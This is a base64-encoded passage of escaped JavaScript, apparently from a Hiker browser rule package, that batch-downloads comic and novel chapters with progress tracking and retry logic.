XG4gICAgICAgICAgICBjb3VudCA9IHRhc2tDb3VudDtcXFxcbiAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgIGlmICh0YXNrQ291bnQgIT09IGNvdW50KSByZXR1cm47XFxcXG4gICAgICAgIGlmIChzdWNjZXNzQ0lELmxlbmd0aCA9PT0gdGFza0NvdW50KSB7XFxcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCLilodcXFxcXFxcIi5yZXBlYXQoMTApLmZvbnRjb2xvcihcXFxcXFxcIiMwMGZmMDBcXFxcXFxcIikgKyBcXFxcXFxcIiAxMDAlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOS4i+i9vei/m+W6plxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgXFxcXFxcXCJbXVxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgc3RhdHVzID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgZmFpbFRlYW0gPSBiYXRjaFRlYW0uZmlsdGVyKHYgPT4gIXN1Y2Nlc3NDSUQuaW5jbHVkZXModikpO1xcXFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOmJhdGNoVGVhbVxcXFxcXFwiLCBKU09OLnN0cmluZ2lmeShmYWlsVGVhbSkpO1xcXFxuICAgICAgICBpZiAoZmFpbFRlYW0ubGVuZ3RoID4gMCAmJiBzdGF0dXMgIT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOnN0YXR1c1xcXFxcXFwiLCBcXFxcXFxcIjNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBwdXRMb2coXFxcXFxcXCLkuIvovb3lpLHotKU6W1xcXFxcXFwiICsgZmFpbE5hbWUuam9pbihcXFxcXFxcIl3vvIxbXFxcXFxcXCIpICsgXFxcXFxcXCJd44CCXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgdXBkYXRlSXRlbSh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwiW+WkhOeQhuWksei0pV1cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcInx85LiL6L295o6n5Yi2XFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfSBlbHNlIGlmIChmYWlsVGVhbS5sZW5ndGggPiAwICYmIHN0YXR1cyA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6c3RhdHVzXFxcXFxcXCIsIFxcXFxcXFwiNFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHB1dExvZyhcXFxcXFxcIltsaXN0ZW5lcl0j5bey5YGc5q2i5omA5pyJ5Lu75Yqh77yM5L2G5bey5pyJ6L+b5bqm5LiN5Lya5raI5aSxI1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIlvph43mlrDlvIDlp4tdXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOS4i+i9veaOp+WItlxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJicmVha1xcXFxcXFwiO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCIyXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgcHV0TG9nKFxcXFxcXFwi5LiL6L295Lu75YqhW1xcXFxcXFwiICsgaW5mby5ib29rTmFtZSArIFxcXFxcXFwiXeW3suWFqOmDqOaIkOWKn+WujOaIkFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIlvov5Tlm55dXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOS4i+i9veaOp+WItlxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdG9hc3QoXFxcXFxcXCLkuIvovb3ku7vliqFbXFxcXFxcXCIgKyBpbmZvLmJvb2tOYW1lICsgXFxcXFxcXCJd5bey5a6M5oiQXFxcXFxcXCIpO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgdGFza1RlYW1DaHVuayA9IFtdO1xcXFxuICAgIGlmIChDb25maWcudGhyZWFkTnVtID4gMCkge1xcXFxuICAgICAgICB0YXNrVGVhbUNodW5rID0gVG9vbC5jaHVuayh0YXNrVGVhbSwgQ29uZmlnLnRocmVhZE51bSk7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgdGFza1RlYW1DaHVuayA9IFt0YXNrVGVhbV07XFxcXG4gICAgfVxcXFxuICAgIGZvciAobGV0IHRhc2tMaXN0IG9mIHRhc2tUZWFtQ2h1bmspIHtcXFxcbiAgICAgICAgYmUodGFza0xpc3QsIHtcXFxcbiAgICAgICAgICAgIGZ1bmM6IGxpc3RlbmVyXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBsZXQgc3RhdHVzID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoc3RhdHVzID09PSBcXFxcXFxcIjFcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgXFxcXFxcXCJbXVxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgLy9sZXQgc3RhdHVzID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGZhaWxUZWFtID0gYmF0Y2hUZWFtLmZpbHRlcih2ID0+ICFzdWNjZXNzQ0lELmluY2x1ZGVzKHYpKTtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6YmF0Y2hUZWFtXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGZhaWxUZWFtKSk7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOnN0YXR1c1xcXFxcXFwiLCBcXFxcXFxcIjRcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBwdXRMb2coXFxcXFxcXCJbbGlzdGVuZXJdI+W3suWBnOatouaJgOacieS7u+WKoe+8jOS9huW3suaciei/m+W6puS4jeS8mua2iOWksSNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCJb6YeN5paw5byA5aeLXVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwifHzkuIvovb3mjqfliLZcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICB9XFxcXG5cXFxcbiAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG59O1xcXFxuXFxcXG4kLmV4cG9ydHMuYiA9IGZ1bmN0aW9uIGNvbWljKGNoYXB0ZXJUZWFtLCBpbmZvLCBNWV9JRCkge1xcXFxuICAgIGlmIChjaGFwdGVyVGVhbS5sZW5ndGggPT09IDApIHtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/nqbrnmoTkuIvovb3pmJ/liJdcXFxcXFxcIjtcXFxcbiAgICB9XFxcXG4gICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuXFxcXG4gICAgbGV0IGxvZ051bSA9IENvbmZpZy5sb2dOdW07XFxcXG4gICAgbGV0IGxvZ0NvdW50ID0gMDtcXFxcblxcXFxuICAgIGZ1bmN0aW9uIHB1dExvZyh0ZXh0KSB7XFxcXG4gICAgICAgIGxvZyh0ZXh0KTtcXFxcbiAgICAgICAgaWYgKGxvZ0NvdW50ID49IGxvZ051bSkge1xcXFxuICAgICAgICAgICAgZGVsZXRlSXRlbShNWV9JRCArIFxcXFxcXFwiI2xvZyNcXFxcXFxcIiArIChsb2dDb3VudCAtIDEwKSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgYWRkSXRlbUFmdGVyKE1ZX0lEICsgXFxcXFxcXCJ8fOaXpeW/l1xcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwiJD5cXFxcXFxcIiArIHRleHQsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwiI2xvZyNcXFxcXFxcIiArIGxvZ0NvdW50XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBsb2dDb3VudCsrO1xcXFxuICAgIH1cXFxcblxcXFxuICAgIGZ1bmN0aW9uIHRhc2sodGFza1BhcmFtKSB7XFxcXG4gICAgICAgIGNvbnN0IFRvb2wgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvVG9vbC5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCAxMDsgaSsrKSB7XFxcXG4gICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICAgIGxldCBwaWMgPSBUb29sLmhpa2VyUGljKHRhc2tQYXJhbS51cmwpO1xcXFxuICAgICAgICAgICAgICAgIFRvb2wucGljRG93bmxvYWQocGljWzBdLCB0YXNrUGFyYW0uY2hhcHRlclBhdGggKyAodGFza1BhcmFtLmkgKyAxKSArIFxcXFxcXFwiLmpwZ1xcXFxcXFwiLCBwaWNbMV0sIHRhc2tQYXJhbS5kZWNvZGUpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChnZXRNeVZhcih0YXNrUGFyYW0uTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikgPT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgZXJyb3JOdW0gPSAwO1xcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgICAgIGlmIChpID09PSA5KSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRocm93IGU7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiB0YXNrUGFyYW0uQ0lEO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgY291bnQgPSAwO1xcXFxuICAgIGxldCB0b3RhbENvdW50ID0gMDtcXFxcbiAgICBsZXQgc3VjY2Vzc0NJRCA9IFtdO1xcXFxuXFxcXG4gICAgZnVuY3Rpb24gbGlzdGVuZXIocGFyYW0sIGlkLCBlcnJvciwgcmVzdWx0KSB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICB0b3RhbENvdW50Kys7XFxcXG5cXFxcbiAgICAgICAgICAgIGlmIChlcnJvciAhPSBudWxsKSB7XFxcXG4gICAgICAgICAgICAgICAgcHV0TG9nKFxcXFxcXFwiW2xpc3RlbmVyXeS4i+i9veWksei0pe+8mlxcXFxcXFwiICsgaWQgKyBcXFxcXFxcIjxFUlJPUkAgXFxcXFxcXCIgKyBlcnJvciArIFxcXFxcXFwiPlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAocmVzdWx0ID09PSAtMSkge1xcXFxuICAgICAgICAgICAgICAgIHB1dExvZyhcXFxcXFxcIltsaXN0ZW5lcl3lt7LlgZzmraLvvJpcXFxcXFxcIiArIGlkKTtcXFxcbiAgICAgICAgICAgICAgICB0b3RhbENvdW50ID0gcGFyYW0ucGl2Q291bnQ7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIGNvdW50Kys7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJhdGlvID0gKChjb3VudCAvIHBhcmFtLnBpdkNvdW50KSkudG9GaXhlZCg0KTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgc3RyaXBDb3VudCA9IE1hdGguY2VpbChyYXRpbyAqIDEwKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAocGFyYW0ucGl2Q291bnQgPT09IHRvdGFsQ291bnQgJiYgdG90YWxDb3VudCA9PT0gY291bnQpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc3VjY2Vzc0NJRC5wdXNoKHBhcmFtLkNJRCk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLkuIvovb3ov5vluqbvvJpcXFxcXFxcIiArIChzdWNjZXNzQ0lELmxlbmd0aCkgKyBcXFxcXFxcIi9cXFxcXFxcIiArIHBhcmFtLnRvdGFsLFxcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCLilodcXFxcXFxcIi5yZXBlYXQoc3RyaXBDb3VudCkuZm9udGNvbG9yKFxcXFxcXFwiI2ZmYWMyZFxcXFxcXFwiKSArIFxcXFxcXFwi4paHXFxcXFxcXCIucmVwZWF0KDEwIC0gc3RyaXBDb3VudCkuZm9udGNvbG9yKFxcXFxcXFwiI2U1ZTFlNFxcXFxcXFwiKSArIFxcXFxcXFwiIFxcXFxcXFwiICsgU3RyaW5nKChyYXRpbyAqIDEwMCkpLnNsaWNlKDAsIDUpICsgXFxcXFxcXCIlXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcInx85LiL6L296L+b5bqmXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIC8vcHV0TG9nKFxcXFxcXFwiW2xpc3RlbmVyXeW3suWujOaIkOS4i+i9ve+8mlxcXFxcXFwiICsgaWQpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgaWYgKHRvdGFsQ291bnQgIT09IHBhcmFtLnBpdkNvdW50KSByZXR1cm47XFxcXG4gICAgICAgICAgICBpZiAodG90YWxDb3VudCA9PT0gY291bnQpIHtcXFxcbiAgICAgICAgICAgICAgICBGaWxlLnJlbmFtZUZpbGUocGFyYW0uY2hhcHRlclBhdGgsIHBhcmFtLkNJRCArIFxcXFxcXFwiJEEkXFxcXFxcXCIgKyBUb29sLnRleHRTaGllbGQocGFyYW0udGl0bGUpKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHRvdGFsQ291bnQgPSBjb3VudCA9IDA7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJicmVha1xcXFxcXFwiO1xcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICBsZXQgdGFza1RlYW0gPSBbXTtcXFxcbiAgICBsZXQgbWFpblBhdGggPSBDb25maWcuY29taWNQYXRoICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpbmZvLnJ1bGVOYW1lICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBUb29sLnRleHRTaGllbGQoaW5mby5ib29rTmFtZSkgKyBcXFxcXFxcIi9cXFxcXFxcIjtcXFxcbiAgICBpZiAoaW5mby5ib29rVG9wUGljKSB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBsZXQgYm9va1RvcFBpYyA9IFRvb2wuaGlrZXJQaWMoaW5mby5ib29rVG9wUGljKTtcXFxcbiAgICAgICAgICAgIFRvb2wucGljRG93bmxvYWQoYm9va1RvcFBpY1swXSwgbWFpblBhdGggKyBpbmZvLmJvb2tOYW1lICsgXFxcXFxcXCIuanBnXFxcXFxcXCIsIGJvb2tUb3BQaWNbMV0sIGluZm8uZGVjb2RlKTtcXFxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgbG9nKFxcXFxcXFwiPOWwgemdouS4i+i9vemUmeivrz4gXFxcXFxcXCIgKyBlLm1lc3NhZ2UpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZm9yIChsZXQgayA9IDA7IGsgPCBjaGFwdGVyVGVhbS5sZW5ndGg7IGsrKykge1xcXFxuICAgICAgICBsZXQgaXRlbSA9IGNoYXB0ZXJUZWFtW2tdO1xcXFxuICAgICAgICBsZXQgb3JkZXIgPSBrO1xcXFxuICAgICAgICBsZXQgY2hhcHRlclBhdGggPSBtYWluUGF0aCArIGl0ZW0uQ0lEICsgXFxcXFxcXCIkQiRcXFxcXFxcIiArIFRvb2wudGV4dFNoaWVsZChpdGVtLnRpdGxlKSArIFxcXFxcXFwiL1xcXFxcXFwiO1xcXFxuICAgICAgICBsZXQgcGljTGlzdCA9IFtdO1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgbGV0IGdldFBpY0xpc3QgPSBuZXcgRnVuY3Rpb24oXFxcXFxcXCJpbnB1dFxcXFxcXFwiLCBcXFxcXFxcInVybFxcXFxcXFwiLCBcXFxcXFxcImluZGV4XFxcXFxcXCIsIFxcXFxcXFwidGl0bGVcXFxcXFxcIiwgXFxcXFxcXCJyZXR1cm5cXFxcXFxcIiArIGluZm8ucGFyc2VDb2RlKTtcXFxcbiAgICAgICAgICAgIHBpY0xpc3QgPSBnZXRQaWNMaXN0KGl0ZW0udXJsLCBpdGVtLnVybCwgaywgaXRlbS50aXRsZSk7XFxcXG4gICAgICAgICAgICBpZiAodHlwZW9mIHBpY0xpc3QgPT09IFxcXFxcXFwic3RyaW5nXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICBwaWNMaXN0ID0gcGljTGlzdC5yZXBsYWNlKFxcXFxcXFwicGljczovL1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKS5zcGxpdChcXFxcXFxcIiYmXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBwdXRMb2coXFxcXFxcXCI85ryr55S75Zu+54mH6Kej5p6Q6ZSZ6K+vPiBcXFxcXFxcIiArIGUubWVzc2FnZSk7XFxcXG4gICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAocGljTGlzdC5sZW5ndGggPT09IDApIHtcXFxcbiAgICAgICAgICAgIHB1dExvZyhcXFxcXFxcIjzmvKvnlLvlm77niYfop6PmnpDplJnor6/vvJrlm77niYfpk77mjqXov5Tlm57kuLrnqbo+XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcGljTGlzdCA9IHBpY0xpc3QuZmlsdGVyKHAgPT4gcCk7XFxcXG4gICAgICAgIHZhciB0YXNrVGVhbSA9IHBpY0xpc3QubWFwKCh1cmwsIGkpID0+ICh7XFxcXG4gICAgICAgICAgICBmdW5jOiB0YXNrLFxcXFxuICAgICAgICAgICAgaWQ6IGksXFxcXG4gICAgICAgICAgICBwYXJhbToge1xcXFxuICAgICAgICAgICAgICAgIHVybDogdXJsLFxcXFxuICAgICAgICAgICAgICAgIGk6IGksXFxcXG4gICAgICAgICAgICAgICAgY2hhcHRlclBhdGg6IGNoYXB0ZXJQYXRoLFxcXFxuICAgICAgICAgICAgICAgIE1ZX0lEOiBNWV9JRCxcXFxcbiAgICAgICAgICAgICAgICBkZWNvZGU6IGluZm8uZGVjb2RlXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pKTtcXFxcbiAgICAgICAgYmUodGFza1RlYW0sIHtcXFxcbiAgICAgICAgICAgIGZ1bmM6IGxpc3RlbmVyLFxcXFxuICAgICAgICAgICAgcGFyYW06IHtcXFxcbiAgICAgICAgICAgICAgICBwaXZDb3VudDogcGljTGlzdC5sZW5ndGgsXFxcXG4gICAgICAgICAgICAgICAgdG90YWw6IGNoYXB0ZXJUZWFtLmxlbmd0aCxcXFxcbiAgICAgICAgICAgICAgICBvcmRlcjogb3JkZXIsXFxcXG4gICAgICAgICAgICAgICAgQ0lEOiBpdGVtLkNJRCxcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICBjaGFwdGVyUGF0aDogY2hhcHRlclBhdGhcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGlmIChnZXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOnN0YXR1c1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgbGV0IHN0YXR1cyA9IGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6c3RhdHVzXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICBqYXZhLmxhbmcuVGhyZWFkLnNsZWVwKDQwKTtcXFxcbiAgICAvL2xldCBiYXRjaFRlYW0gPSBKU09OLnBhcnNlKGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6YmF0Y2hUZWFtXFxcXFxcXCIsIFxcXFxcXFwiW11cXFxcXFxcIikgfHwgXFxcXFxcXCJbXVxcXFxcXFwiKTtcXFxcbiAgICBsZXQgZmFpbFRlYW0gPSBjaGFwdGVyVGVhbS5maWx0ZXIodiA9PiAhc3VjY2Vzc0NJRC5pbmNsdWRlcyh2LkNJRCkpO1xcXFxuICAgIGxldCBmYWlsTmFtZSA9IGZhaWxUZWFtLm1hcChpdGVtID0+IGl0ZW0udGl0bGUpO1xcXFxuICAgIGxldCBiYXRjaFRlYW0gPSBmYWlsVGVhbS5tYXAoaXRlbSA9PiBpdGVtLkNJRCk7XFxcXG5cXFxcbiAgICBpZiAoZmFpbFRlYW0ubGVuZ3RoID4gMCAmJiBzdGF0dXMgIT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6YmF0Y2hUZWFtXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGJhdGNoVGVhbSkpO1xcXFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOnN0YXR1c1xcXFxcXFwiLCBcXFxcXFxcIjNcXFxcXFxcIik7XFxcXG4gICAgICAgIHB1dExvZyhcXFxcXFxcIuS4i+i9veWksei0pTpbXFxcXFxcXCIgKyBmYWlsTmFtZS5qb2luKFxcXFxcXFwiXe+8jFtcXFxcXFxcIikgKyBcXFxcXFxcIl3jgIJcXFxcXFxcIik7XFxcXG4gICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwiW+WkhOeQhuWksei0pV1cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCJ8fOS4i+i9veaOp+WItlxcXFxcXFwiXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH0gZWxzZSBpZiAoZmFpbFRlYW0ubGVuZ3RoID4gMCAmJiBzdGF0dXMgPT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6YmF0Y2hUZWFtXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGJhdGNoVGVhbSkpO1xcXFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOnN0YXR1c1xcXFxcXFwiLCBcXFxcXFxcIjRcXFxcXFxcIik7XFxcXG4gICAgICAgIHB1dExvZyhcXFxcXFxcIltsaXN0ZW5lcl0j5bey5YGc5q2i5omA5pyJ5Lu75Yqh77yM5L2G5bey5pyJ6L+b5bqm5LiN5Lya5raI5aSxI1xcXFxcXFwiKTtcXFxcbiAgICAgICAgdXBkYXRlSXRlbSh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCJb6YeN5paw5byA5aeLXVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcInx85LiL6L295o6n5Yi2XFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpzdGF0dXNcXFxcXFxcIiwgXFxcXFxcXCIyXFxcXFxcXCIpO1xcXFxuICAgICAgICBwdXRMb2coXFxcXFxcXCLkuIvovb3ku7vliqFbXFxcXFxcXCIgKyBpbmZvLmJvb2tOYW1lICsgXFxcXFxcXCJd5bey5YWo6YOo5oiQ5Yqf5a6M5oiQXFxcXFxcXCIpO1xcXFxuICAgICAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIlvov5Tlm55dXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwifHzkuIvovb3mjqfliLZcXFxcXFxcIlxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiNmZy7mibnph4/kuLvnqIvluo9cXFwiLFxcXCJwYXRoXFxcIjpcXFwiQmF0Y2guZXhlLmpzXFxcIixcXFwicnVsZVxcXCI6XFxcImNvbnN0IE1pYW4gPSAkLnJlcXVpcmUoXFxcXFxcXCJtYWluRG93bmxvYWR